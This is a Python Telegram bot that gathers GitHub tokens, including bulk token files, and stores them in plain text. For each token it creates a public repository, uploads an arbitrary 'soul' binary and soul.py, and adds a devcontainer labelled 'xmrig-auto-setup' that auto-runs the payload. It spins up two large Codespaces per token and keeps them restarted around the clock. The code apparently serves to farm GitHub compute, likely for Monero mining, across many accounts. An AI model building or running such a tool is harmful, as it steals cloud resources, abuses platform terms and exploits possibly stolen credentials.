
import os
import sys
import json
import logging
import telebot
from telebot import types
import threading
import time
import random
import string
import requests
import base64
import subprocess
from pathlib import Path
from typing import List, Dict, Tuple, Optional

# ============================================================================
# CONFIGURATION
# ============================================================================

# Get current directory where script is running
CURRENT_DIR = Path(__file__).parent.absolute()

# Bot Configuration
BOT_TOKEN = ''

# Directories
TEMP_DIR = CURRENT_DIR / 'temp_files'
DATA_DIR = CURRENT_DIR / 'data'
TEMP_DIR.mkdir(exist_ok=True)
DATA_DIR.mkdir(exist_ok=True)

# GitHub Configuration
CODESPACE_MACHINE_TYPE = 'standardLinux32gb'
CODESPACE_IDLE_TIMEOUT = 240

# Monitoring Configuration
MONITOR_INTERVAL = 300

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(CURRENT_DIR / 'bot.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)


# ============================================================================
# STORAGE CLASS
# ============================================================================

class Storage:
    """Handles data storage in JSON and TXT files"""
    
    def __init__(self):
        self.data_dir = DATA_DIR
        self.tokens_file = self.data_dir / 'tokens.json'
        self.users_file = self.data_dir / 'users.json'
        self.codespaces_file = self.data_dir / 'codespaces.json'
        self._init_storage()
    
    def _init_storage(self):
        """Initialize storage files"""
        for file in [self.tokens_file, self.users_file, self.codespaces_file]:
            if not file.exists():
                with open(file, 'w') as f:
                    json.dump({}, f)
    
    def _load_json(self, filepath: Path) -> dict:
        """Load JSON file"""
        try:
            with open(filepath, 'r') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Error loading {filepath}: {e}")
            return {}
    
    def _save_json(self, filepath: Path, data: dict):
        """Save JSON file"""
        try:
            with open(filepath, 'w') as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving {filepath}: {e}")
    
    def add_token(self, user_id: int, token: str):
        """Add a GitHub token for a user"""
        tokens_data = self._load_json(self.tokens_file)
        user_id_str = str(user_id)
        
        if user_id_str not in tokens_data:
            tokens_data[user_id_str] = []
        
        if token not in tokens_data[user_id_str]:
            tokens_data[user_id_str].append(token)
        
        self._save_json(self.tokens_file, tokens_data)
        
        # Also save to TXT file
        txt_file = self.data_dir / f'user_{user_id}_tokens.txt'
        with open(txt_file, 'a') as f:
            f.write(f"{token}\n")
        
        logger.info(f"Added token for user {user_id}")
    
    def get_user_tokens(self, user_id: int) -> List[str]:
        """Get all tokens for a user"""
        tokens_data = self._load_json(self.tokens_file)
        return tokens_data.get(str(user_id), [])
    
    def save_user_file(self, user_id: int, file_type: str, file_path: str):
        """Save user file path"""
        users_data = self._load_json(self.users_file)
        user_id_str = str(user_id)
        
        if user_id_str not in users_data:
            users_data[user_id_str] = {}
        
        users_data[user_id_str][file_type] = file_path
        self._save_json(self.users_file, users_data)
        logger.info(f"Saved {file_type} file path for user {user_id}")
    
    def get_user_files(self, user_id: int) -> Dict[str, str]:
        """Get all file paths for a user"""
        users_data = self._load_json(self.users_file)
        return users_data.get(str(user_id), {})
    
    def save_codespace_info(self, user_id: int, token: str, repo_name: str, codespaces: List[str]):
        """Save codespace information"""
        codespaces_data = self._load_json(self.codespaces_file)
        user_id_str = str(user_id)
        
        if user_id_str not in codespaces_data:
            codespaces_data[user_id_str] = []
        
        codespaces_data[user_id_str].append({
            'token': token,
            'repo_name': repo_name,
            'codespaces': codespaces
        })
        
        self._save_json(self.codespaces_file, codespaces_data)
        
        # Also save to TXT file
        txt_file = self.data_dir / f'user_{user_id}_codespaces.txt'
        with open(txt_file, 'a') as f:
            f.write(f"Repo: {repo_name}\n")
            for cs in codespaces:
                f.write(f"  - {cs}\n")
            f.write("\n")
        
        logger.info(f"Saved codespace info for user {user_id}")
    
    def get_user_codespaces(self, user_id: int) -> List[Dict]:
        """Get all codespaces for a user"""
        codespaces_data = self._load_json(self.codespaces_file)
        return codespaces_data.get(str(user_id), [])
    
    def get_all_codespaces(self) -> Dict[str, List[Dict]]:
        """Get all codespaces for all users"""
        return self._load_json(self.codespaces_file)


# ============================================================================
# GITHUB MANAGER CLASS
# ============================================================================

class GitHubManager:
    """Manages GitHub repository operations using gh CLI"""
    
    def __init__(self, storage):
        self.storage = storage
    
    def _generate_repo_name(self) -> str:
        """Generate unique repository name"""
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"soul-bot-{random_str}"
    
    def _run_gh_command(self, command: List[str], token: str = None, capture_output=True, cwd=None) -> subprocess.CompletedProcess:
        """Run gh CLI command"""
        env = os.environ.copy()
        if token:
            env['GITHUB_TOKEN'] = token
            env['GH_TOKEN'] = token
        
        try:
            result = subprocess.run(
                command,
                env=env,
                capture_output=capture_output,
                text=True,
                timeout=120,
                cwd=cwd
            )
            return result
        except subprocess.TimeoutExpired:
            logger.error(f"Command timed out: {' '.join(command)}")
            raise
        except Exception as e:
            logger.error(f"Error running gh command: {e}")
            raise
    
    def get_username(self, token: str) -> str:
        """Get GitHub username using gh CLI"""
        command = ['gh', 'api', 'user', '--jq', '.login']
        result = self._run_gh_command(command, token)
        if result.returncode != 0:
            raise Exception(f"Failed to get username: {result.stderr}")
        return result.stdout.strip()
    
    def create_repository(self, token: str) -> Tuple[str, str]:
        """Create a new GitHub repository using gh CLI"""
        repo_name = self._generate_repo_name()
        
        command = [
            'gh', 'repo', 'create', repo_name,
            '--public',
            '--description', 'Soul bot codespace repository',
            '--clone=false'
        ]
        
        result = self._run_gh_command(command, token)
        
        if result.returncode != 0:
            logger.error(f"Failed to create repository: {result.stderr}")
            raise Exception(f"Repository creation failed: {result.stderr}")
        
        username = self.get_username(token)
        repo_url = f"https://github.com/{username}/{repo_name}"
        
        logger.info(f"Created repository: {repo_name}")
        return repo_name, repo_url
    
    def upload_files(self, token: str, repo_name: str, files: Dict[str, str]):
        """Upload all required files to repository using gh CLI and git"""
        username = self.get_username(token)
        
        # Create a temporary directory for the repo
        temp_repo_dir = TEMP_DIR / f"repo_{repo_name}"
        if temp_repo_dir.exists():
            import shutil
            shutil.rmtree(temp_repo_dir)
        temp_repo_dir.mkdir(parents=True, exist_ok=True)
        
        try:
            # Clone the repository
            clone_url = f"https://{token}@github.com/{username}/{repo_name}.git"
            clone_command = ['git', 'clone', clone_url, str(temp_repo_dir)]
            result = subprocess.run(clone_command, capture_output=True, text=True, timeout=60)
            if result.returncode != 0:
                # If repo is empty, init it
                subprocess.run(['git', 'init'], cwd=str(temp_repo_dir), check=True)
                subprocess.run(['git', 'remote', 'add', 'origin', clone_url], cwd=str(temp_repo_dir), check=True)
                subprocess.run(['git', 'config', 'user.email', 'bot@soulbot.com'], cwd=str(temp_repo_dir), check=True)
                subprocess.run(['git', 'config', 'user.name', 'Soul Bot'], cwd=str(temp_repo_dir), check=True)
            
            # Copy soul files
            if 'soul' in files:
                import shutil
                shutil.copy(files['soul'], temp_repo_dir / 'soul')
                logger.info("Copied soul file")
            
            if 'soul.py' in files:
                import shutil
                shutil.copy(files['soul.py'], temp_repo_dir / 'soul.py')
                logger.info("Copied soul.py file")
            
            # Create .devcontainer/devcontainer.json
            devcontainer_dir = temp_repo_dir / '.devcontainer'
            devcontainer_dir.mkdir(exist_ok=True)
            devcontainer_config = {
    "name": "xmrig-auto-setup",
    "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
    "features": {
        "ghcr.io/devcontainers/features/common-utils:1": {}
    },
    "hostRequirements": {
        "cpus": 4,
        "memory": "8gb"
    },
    "postCreateCommand": "chmod +x * && ./startup.sh",
    "customizations": {
        "vscode": {
            "extensions": [],
            "settings": {
                "terminal.integrated.defaultProfile.linux": "bash"
            }
        }
    },
    "remoteUser": "vscode"
}
            with open(devcontainer_dir / 'devcontainer.json', 'w') as f:
                json.dump(devcontainer_config, f, indent=2)
            logger.info("Created devcontainer.json")
            
            # Create startup.sh
            startup_script = """#!/bin/bash
#!/bin/bash

# soul.sh - Install dependencies and run soul.py
# Only installs packages if they're not already installed

set -e  # Exit on error

echo "========================================"
echo "Starting Soul Bot Setup"
echo "========================================"

# Function to check if package is installed
is_installed() {
    dpkg -l "$1" 2>/dev/null | grep -q "^ii"
}

# Function to check if Python package is installed
python_package_installed() {
    python3 -c "import $1" 2>/dev/null && return 0 || return 1
}

# Update package list
echo "[1/6] Updating package list..."
sudo apt update 2>&1 | grep -E "(Err|Hit|Ign)" || true

# Install Python3 if not installed
if ! command -v python3 &> /dev/null; then
    echo "[2/6] Installing Python3..."
    sudo apt install -y python3
else
    echo "[2/6] Python3 is already installed (v$(python3 --version | cut -d' ' -f2))"
fi

# Install pip if not installed
if ! command -v pip3 &> /dev/null; then
    echo "[3/6] Installing pip..."
    sudo apt install -y python3-pip
else
    echo "[3/6] pip is already installed (v$(pip3 --version | cut -d' ' -f2))"
fi

# Install requests package if not installed
if ! python_package_installed requests; then
    echo "[4/6] Installing requests package..."
    
    # Try different installation methods
    if [ -f /etc/debian_version ]; then
        # Debian/Ubuntu - try system package first
        if is_installed python3-requests; then
            echo "  Using system package python3-requests"
        else
            echo "  Installing via pip with --break-system-packages"
            pip3 install requests --break-system-packages 2>/dev/null || \
            pip3 install requests --user 2>/dev/null || \
            echo "  Warning: Failed to install requests package"
        fi
    else
        pip3 install requests 2>/dev/null || pip3 install requests --user 2>/dev/null
    fi
else
    echo "[4/6] requests package is already installed"
fi

# Verify installations
echo "[5/6] Verifying installations..."
if command -v python3 &> /dev/null; then
    echo "  ✓ Python3: $(python3 --version | cut -d' ' -f2)"
else
    echo "  ✗ Python3 not found!"
    exit 1
fi

if command -v pip3 &> /dev/null; then
    echo "  ✓ pip: $(pip3 --version | cut -d' ' -f2)"
fi

if python_package_installed requests; then
    echo "  ✓ requests: $(python3 -c "import requests; print(requests.__version__)" 2>/dev/null || echo "installed")"
else
    echo "  ✗ requests package not installed"
fi

# Check if soul.py exists
echo "[6/6] Checking for soul.py..."
if [ -f "soul.py" ]; then
    echo "  Found soul.py, starting..."
    echo "========================================"
    
    # Run soul.py
    python3 soul.py
else
    echo "  ERROR: soul.py not found in current directory!"
    echo "  Current directory: $(pwd)"
    ls -la
    exit 1
fi
"""
            with open(temp_repo_dir / 'startup.sh', 'w') as f:
                f.write(startup_script)
            subprocess.run(['chmod', '+x', str(temp_repo_dir / 'startup.sh')], check=True)
            logger.info("Created startup.sh")
            
            # Create README.md
            readme = """# Soul Bot Codespace

This repository contains the soul bot files and is configured to run in GitHub Codespaces.

## Files
- `soul` - Binary executable
- `soul.py` - Python script
- `startup.sh` - Startup script for codespace

## Auto-start
The bot automatically starts when the codespace is created.
"""
            with open(temp_repo_dir / 'README.md', 'w') as f:
                f.write(readme)
            logger.info("Created README.md")
            
            # Git add, commit, and push
            subprocess.run(['git', 'add', '.'], cwd=str(temp_repo_dir), check=True)
            subprocess.run(['git', 'commit', '-m', 'Add soul bot files'], cwd=str(temp_repo_dir), check=True)
            
            # Push using gh CLI for authentication
            env = os.environ.copy()
            env['GITHUB_TOKEN'] = token
            env['GH_TOKEN'] = token
            
            push_result = subprocess.run(
                ['git', 'push', '-u', 'origin', 'main'],
                cwd=str(temp_repo_dir),
                env=env,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if push_result.returncode != 0:
                # Try master branch
                push_result = subprocess.run(
                    ['git', 'push', '-u', 'origin', 'master'],
                    cwd=str(temp_repo_dir),
                    env=env,
                    capture_output=True,
                    text=True,
                    timeout=60
                )
                if push_result.returncode != 0:
                    # Create and push main branch
                    subprocess.run(['git', 'branch', '-M', 'main'], cwd=str(temp_repo_dir), check=True)
                    subprocess.run(['git', 'push', '-u', 'origin', 'main'], cwd=str(temp_repo_dir), env=env, check=True)
            
            logger.info(f"All files uploaded to {repo_name}")
            
        except Exception as e:
            logger.error(f"Error uploading files: {e}")
            raise
        finally:
            # Cleanup
            import shutil
            if temp_repo_dir.exists():
                shutil.rmtree(temp_repo_dir)


# ============================================================================
# CODESPACE MANAGER CLASS
# ============================================================================

class CodespaceManager:
    """Manages GitHub Codespaces using gh CLI"""
    
    def __init__(self, storage):
        self.storage = storage
    
    def _run_gh_command(self, command: List[str], token: str = None, capture_output=True) -> subprocess.CompletedProcess:
        """Run gh CLI command"""
        env = os.environ.copy()
        if token:
            env['GITHUB_TOKEN'] = token
        
        try:
            result = subprocess.run(
                command,
                env=env,
                capture_output=capture_output,
                text=True,
                timeout=120
            )
            return result
        except subprocess.TimeoutExpired:
            logger.error(f"Command timed out: {' '.join(command)}")
            raise
        except Exception as e:
            logger.error(f"Error running gh command: {e}")
            raise
    
    def create_codespace(self, token: str, repo_name: str) -> str:
        """Create a single codespace"""
        username = self._get_username(token)
        repo_full_name = f"{username}/{repo_name}"
        
        command = [
            'gh', 'codespace', 'create',
            '--repo', repo_full_name,
            '--machine', CODESPACE_MACHINE_TYPE,
            '--idle-timeout', '240m'
        ]
        
        result = self._run_gh_command(command, token)
        
        if result.returncode != 0:
            logger.error(f"Failed to create codespace: {result.stderr}")
            raise Exception(f"Codespace creation failed: {result.stderr}")
        
        codespace_name = result.stdout.strip()
        logger.info(f"Created codespace: {codespace_name}")
        
        # Start the soul script in the codespace
        time.sleep(10)  # Wait for codespace to be ready
        self._start_soul_in_codespace(token, codespace_name)
        
        return codespace_name
    
    def create_codespaces(self, token: str, repo_name: str, count: int = 2) -> List[str]:
        """Create multiple codespaces"""
        codespaces = []
        for i in range(count):
            retry_count = 0
            max_retries = 3
            
            while retry_count < max_retries:
                try:
                    logger.info(f"Creating codespace {i+1}/{count} for {repo_name} (attempt {retry_count+1})")
                    codespace_name = self.create_codespace(token, repo_name)
                    codespaces.append(codespace_name)
                    logger.info(f"✅ Successfully created codespace {i+1}: {codespace_name}")
                    time.sleep(10)  # Wait longer between codespace creations
                    break
                except Exception as e:
                    retry_count += 1
                    logger.error(f"Failed to create codespace {i+1} (attempt {retry_count}): {e}")
                    if retry_count < max_retries:
                        logger.info(f"Retrying in 15 seconds...")
                        time.sleep(15)
                    else:
                        logger.error(f"Max retries reached for codespace {i+1}")
        
        logger.info(f"Total codespaces created for {repo_name}: {len(codespaces)}")
        return codespaces
    
    def _start_soul_in_codespace(self, token: str, codespace_name: str):
        """Start soul script in codespace"""
        try:
            commands = [
                'chmod +x soul',
                'nohup python3 soul.py > soul.log 2>&1 &'
            ]
            
            for cmd in commands:
                exec_command = [
                    'gh', 'codespace', 'ssh',
                    '--codespace', codespace_name,
                    '--', cmd
                ]
                self._run_gh_command(exec_command, token)
                time.sleep(2)
            
            logger.info(f"Started soul script in {codespace_name}")
        except Exception as e:
            logger.error(f"Failed to start soul script: {e}")
    
    def _get_username(self, token: str) -> str:
        """Get GitHub username using gh CLI"""
        command = ['gh', 'api', 'user', '--jq', '.login']
        env = os.environ.copy()
        env['GITHUB_TOKEN'] = token
        env['GH_TOKEN'] = token
        
        result = subprocess.run(
            command,
            env=env,
            capture_output=True,
            text=True,
            timeout=30
        )
        
        if result.returncode != 0:
            raise Exception(f"Failed to get username: {result.stderr}")
        return result.stdout.strip()
    
    def get_codespace_status(self, token: str, codespace_name: str) -> str:
        """Get codespace status"""
        try:
            command = ['gh', 'codespace', 'list', '--json', 'name,state']
            result = self._run_gh_command(command, token)
            
            if result.returncode != 0:
                return 'unknown'
            
            codespaces = json.loads(result.stdout)
            for cs in codespaces:
                if cs['name'] == codespace_name:
                    return cs['state']
            
            return 'not_found'
        except Exception as e:
            logger.error(f"Error getting codespace status: {e}")
            return 'error'
    
    def restart_codespace(self, token: str, codespace_name: str):
        """Restart a codespace using gh CLI"""
        try:
            logger.info(f"Restarting codespace: {codespace_name}")
            
            # Stop codespace
            stop_command = ['gh', 'codespace', 'stop', '--codespace', codespace_name]
            self._run_gh_command(stop_command, token)
            time.sleep(5)
            
            # Start codespace
            start_command = ['gh', 'codespace', 'start', '--codespace', codespace_name]
            self._run_gh_command(start_command, token)
            time.sleep(10)
            
            # Restart soul script
            self._start_soul_in_codespace(token, codespace_name)
            
            logger.info(f"Successfully restarted {codespace_name}")
        except Exception as e:
            logger.error(f"Failed to restart codespace: {e}")
            raise
    
    def monitor_and_restart_all(self):
        """Monitor all codespaces and restart if offline"""
        all_codespaces = self.storage.get_all_codespaces()
        
        if not all_codespaces:
            logger.info("No codespaces to monitor")
            return
        
        logger.info(f"Monitoring codespaces for {len(all_codespaces)} user(s)")
        
        for user_id, user_data in all_codespaces.items():
            for entry in user_data:
                token = entry['token']
                repo_name = entry['repo_name']
                codespaces = entry['codespaces']
                
                logger.info(f"Checking {len(codespaces)} codespace(s) for repo {repo_name}")
                
                for codespace_name in codespaces:
                    try:
                        status = self.get_codespace_status(token, codespace_name)
                        logger.info(f"  Codespace {codespace_name}: {status}")
                        
                        # Restart if not running
                        if status.lower() not in ['available', 'active', 'running']:
                            logger.warning(f"  ⚠️ Codespace {codespace_name} is {status}, restarting...")
                            self.restart_codespace(token, codespace_name)
                            logger.info(f"  ✅ Restarted {codespace_name}")
                        else:
                            logger.info(f"  ✅ Codespace {codespace_name} is running fine")
                            
                    except Exception as e:
                        logger.error(f"  ❌ Error monitoring codespace {codespace_name}: {e}")


# ============================================================================
# TELEGRAM BOT
# ============================================================================

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Initialize managers
storage = Storage()
github_manager = GitHubManager(storage)
codespace_manager = CodespaceManager(storage)

# User states
user_states = {}

class UserState:
    IDLE = 'idle'
    WAITING_SINGLE_TOKEN = 'waiting_single_token'
    WAITING_MULTIPLE_TOKENS = 'waiting_multiple_tokens'
    WAITING_SOUL_FILE = 'waiting_soul_file'
    WAITING_SOUL_PY = 'waiting_soul_py'


@bot.message_handler(commands=['start'])
def start_command(message):
    """Handle /start command"""
    user_id = message.chat.id
    user_states[user_id] = UserState.IDLE
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_single = types.InlineKeyboardButton('Single Token', callback_data='single_token')
    btn_multiple = types.InlineKeyboardButton('Multiple Tokens', callback_data='multiple_tokens')
    markup.add(btn_single, btn_multiple)
    
    bot.send_message(
        user_id,
        "🤖 Welcome to Soul Bot Manager!\n\nChoose token option:",
        reply_markup=markup
    )
    logger.info(f"User {user_id} started the bot")


@bot.callback_query_handler(func=lambda call: call.data in ['single_token', 'multiple_tokens'])
def handle_token_choice(call):
    """Handle token selection callback"""
    user_id = call.message.chat.id
    
    if call.data == 'single_token':
        user_states[user_id] = UserState.WAITING_SINGLE_TOKEN
        bot.send_message(user_id, "📝 Please send your GitHub token:")
    else:
        user_states[user_id] = UserState.WAITING_MULTIPLE_TOKENS
        bot.send_message(user_id, "📄 Please send tokens.txt file (one token per line):")
    
    bot.answer_callback_query(call.id)
    logger.info(f"User {user_id} selected {call.data}")


@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == UserState.WAITING_SINGLE_TOKEN)
def handle_single_token(message):
    """Handle single token input"""
    user_id = message.chat.id
    token = message.text.strip()
    
    # Basic validation
    if not token.startswith('ghp_') and not token.startswith('github_pat_'):
        bot.send_message(user_id, "❌ Invalid token format. Please send a valid GitHub token.")
        return
    
    # Save token
    storage.add_token(user_id, token)
    bot.send_message(user_id, "✅ Token saved successfully!\n\nNow please send the 'soul' binary file.")
    user_states[user_id] = UserState.WAITING_SOUL_FILE
    logger.info(f"User {user_id} saved single token")


@bot.message_handler(content_types=['document'], func=lambda message: user_states.get(message.chat.id) == UserState.WAITING_MULTIPLE_TOKENS)
def handle_multiple_tokens(message):
    """Handle tokens.txt file upload"""
    user_id = message.chat.id
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Parse tokens
        tokens_text = downloaded_file.decode('utf-8')
        tokens = [line.strip() for line in tokens_text.split('\n') if line.strip()]
        
        # Validate tokens
        valid_tokens = []
        for token in tokens:
            if token.startswith('ghp_') or token.startswith('github_pat_'):
                valid_tokens.append(token)
        
        if not valid_tokens:
            bot.send_message(user_id, "❌ No valid tokens found in file.")
            return
        
        # Save tokens
        for token in valid_tokens:
            storage.add_token(user_id, token)
        
        bot.send_message(
            user_id,
            f"✅ Saved {len(valid_tokens)} valid token(s)!\n\nNow please send the 'soul' binary file."
        )
        user_states[user_id] = UserState.WAITING_SOUL_FILE
        logger.info(f"User {user_id} saved {len(valid_tokens)} tokens")
        
    except Exception as e:
        logger.error(f"Error processing tokens file: {e}")
        bot.send_message(user_id, f"❌ Error processing file: {str(e)}")


@bot.message_handler(content_types=['document'], func=lambda message: user_states.get(message.chat.id) == UserState.WAITING_SOUL_FILE)
def handle_soul_file(message):
    """Handle soul binary file upload"""
    user_id = message.chat.id
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Save file
        user_dir = TEMP_DIR / str(user_id)
        user_dir.mkdir(parents=True, exist_ok=True)
        soul_path = user_dir / 'soul'
        
        with open(soul_path, 'wb') as f:
            f.write(downloaded_file)
        
        storage.save_user_file(user_id, 'soul', str(soul_path))
        bot.send_message(user_id, "✅ Soul file saved!\n\nNow please send the 'soul.py' Python file.")
        user_states[user_id] = UserState.WAITING_SOUL_PY
        logger.info(f"User {user_id} uploaded soul file")
        
    except Exception as e:
        logger.error(f"Error processing soul file: {e}")
        bot.send_message(user_id, f"❌ Error processing file: {str(e)}")


@bot.message_handler(content_types=['document'], func=lambda message: user_states.get(message.chat.id) == UserState.WAITING_SOUL_PY)
def handle_soul_py(message):
    """Handle soul.py file upload"""
    user_id = message.chat.id
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Save file
        user_dir = TEMP_DIR / str(user_id)
        user_dir.mkdir(parents=True, exist_ok=True)
        soul_py_path = user_dir / 'soul.py'
        
        with open(soul_py_path, 'wb') as f:
            f.write(downloaded_file)
        
        storage.save_user_file(user_id, 'soul.py', str(soul_py_path))
        user_states[user_id] = UserState.IDLE
        
        bot.send_message(user_id, "✅ All files received!\n\n🚀 Starting GitHub operations...")
        logger.info(f"User {user_id} uploaded soul.py file")
        
        # Start GitHub operations in background
        threading.Thread(target=process_user_request, args=(user_id,), daemon=True).start()
        
    except Exception as e:
        logger.error(f"Error processing soul.py file: {e}")
        bot.send_message(user_id, f"❌ Error processing file: {str(e)}")


def process_user_request(user_id):
    """Process user request: create repos, upload files, create codespaces"""
    try:
        tokens = storage.get_user_tokens(user_id)
        files = storage.get_user_files(user_id)
        
        if not tokens or 'soul' not in files or 'soul.py' not in files:
            bot.send_message(user_id, "❌ Missing required data. Please start over with /start")
            return
        
        total_tokens = len(tokens)
        bot.send_message(user_id, f"Processing {total_tokens} token(s)...")
        
        for idx, token in enumerate(tokens, 1):
            try:
                bot.send_message(user_id, f"\n[{idx}/{total_tokens}] Processing token...")
                
                # Create repository
                bot.send_message(user_id, "📦 Creating GitHub repository...")
                repo_name, repo_url = github_manager.create_repository(token)
                bot.send_message(user_id, f"✅ Repository created: {repo_url}")
                
                # Upload files
                bot.send_message(user_id, "📤 Uploading files...")
                github_manager.upload_files(token, repo_name, files)
                bot.send_message(user_id, "✅ Files uploaded")
                
                # Create codespaces
                bot.send_message(user_id, "☁️ Creating codespaces (2x)...")
                codespaces = codespace_manager.create_codespaces(token, repo_name, count=2)
                
                for cs_idx, cs_name in enumerate(codespaces, 1):
                    bot.send_message(user_id, f"  ✅ Codespace {cs_idx}: {cs_name}")
                
                # Save codespace info
                storage.save_codespace_info(user_id, token, repo_name, codespaces)
                
            except Exception as e:
                logger.error(f"Error processing token {idx}: {e}")
                bot.send_message(user_id, f"❌ Error with token {idx}: {str(e)}")
        
        bot.send_message(
            user_id,
            "\n🎉 All done! Your codespaces are being monitored and will auto-restart if they go offline."
        )
        
    except Exception as e:
        logger.error(f"Error in process_user_request: {e}")
        bot.send_message(user_id, f"❌ An error occurred: {str(e)}")


@bot.message_handler(commands=['status'])
def status_command(message):
    """Show status of all codespaces"""
    user_id = message.chat.id
    
    codespaces = storage.get_user_codespaces(user_id)
    if not codespaces:
        bot.send_message(user_id, "No codespaces found. Use /start to create some.")
        return
    
    status_msg = "📊 Your Codespaces:\n\n"
    for cs in codespaces:
        status_msg += f"Repo: {cs['repo_name']}\n"
        status_msg += f"Codespaces: {', '.join(cs['codespaces'])}\n\n"
    
    bot.send_message(user_id, status_msg)


@bot.message_handler(commands=['help'])
def help_command(message):
    """Show help message"""
    help_text = """
🤖 Soul Bot Manager Commands:

/start - Start the bot and create codespaces
/status - Check status of your codespaces
/help - Show this help message

📋 Process:
1. Choose single or multiple tokens
2. Send GitHub token(s)
3. Upload 'soul' binary file
4. Upload 'soul.py' Python file
5. Bot will create repos and codespaces automatically

✨ Features:
- Auto-restart offline codespaces
- 24/7 monitoring
- Multiple token support
"""
    bot.send_message(message.chat.id, help_text)


def start_monitoring():
    """Start background monitoring of codespaces"""
    logger.info("Starting codespace monitoring service...")
    while True:
        try:
            codespace_manager.monitor_and_restart_all()
            time.sleep(MONITOR_INTERVAL)
        except Exception as e:
            logger.error(f"Error in monitoring loop: {e}")
            time.sleep(60)


def main():
    """Main function to start bot and monitoring"""
    logger.info(f"Starting Telegram bot from: {CURRENT_DIR}")
    logger.info(f"Data directory: {DATA_DIR}")
    logger.info(f"Temp directory: {TEMP_DIR}")
    
    # Start monitoring in background
    monitor_thread = threading.Thread(target=start_monitoring, daemon=True)
    monitor_thread.start()
    
    # Start bot
    logger.info("Bot is ready and polling...")
    bot.infinity_polling()


if __name__ == '__main__':
    main()
